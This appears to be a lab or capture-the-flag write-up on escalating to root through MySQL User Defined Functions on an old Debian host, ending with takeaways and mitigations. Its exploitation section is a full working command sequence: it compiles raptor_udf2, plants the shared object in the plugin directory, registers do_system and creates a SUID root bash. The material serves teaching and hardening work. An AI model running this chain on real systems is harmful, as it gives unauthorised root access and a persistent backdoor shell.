# Linux Privilege Escalation ‚Äì MySQL UDF to Root

## üß™ Challenge Overview

This challenge demonstrates a **Linux privilege escalation** technique abusing **MySQL User Defined Functions (UDFs)** on an outdated Debian system.  
The objective is to escalate from a low-privileged local user to **root** by leveraging:

- Misconfigured MySQL root access
- Writable MySQL plugin directory
- Execution of system commands via a malicious UDF

---

## üéØ Target Environment

- **OS**: Debian (legacy)
- **User**: `user` (UID 1000)
- **MySQL Version**: 5.1.73
- **Initial Access**: Local shell as `user`
- **Compiler Available**: `gcc`
- **MySQL Root**: No password required

---

## üîç Enumeration

### User Context
```bash
whoami
# user

id
# uid=1000(user) gid=1000(user)

MySQL Access

mysql -u root

‚úÖ Successful login without a password indicates a serious misconfiguration.
‚ö†Ô∏è Vulnerability Summary

    MySQL is running with root privileges

    MySQL root user can:

        Write files to disk

        Load shared object plugins

        Execute UDFs

    The MySQL plugin directory is writable:

    /usr/lib/mysql/plugin/

This allows arbitrary command execution as root via a malicious UDF.
üß® Exploitation Steps
1Ô∏è‚É£ Compile the Malicious UDF

Using the public exploit raptor_udf2.c:

gcc -g -c raptor_udf2.c -fPIC
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc

This produces a shared object capable of executing system commands.
2Ô∏è‚É£ Upload the UDF via MySQL

use mysql;
create table foo(line blob);

insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';

This bypasses filesystem permission issues by abusing MySQL‚Äôs file handling.
3Ô∏è‚É£ Register the UDF

create function do_system returns integer soname 'raptor_udf2.so';

The malicious function is now callable directly from SQL.
4Ô∏è‚É£ Execute Commands as Root

select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');

This creates a SUID root bash binary.
5Ô∏è‚É£ Get Root Shell

/tmp/rootbash -p

‚úÖ Root access obtained.
üèÜ Result

    Privilege escalation from user ‚Üí root

    Full system compromise

    Persistent root shell achieved

üß† Key Takeaways

    Service misconfigurations can bridge user ‚Üí root boundaries

    Old MySQL versions are extremely dangerous when misconfigured

    File write + plugin load = code execution

    Always enumerate:

        MySQL access

        Plugin directories

        Service privileges

üìå Mitigations

    Never run MySQL as root

    Enforce MySQL root passwords

    Restrict secure_file_priv

    Disable UDFs where not required

    Keep systems and services updated
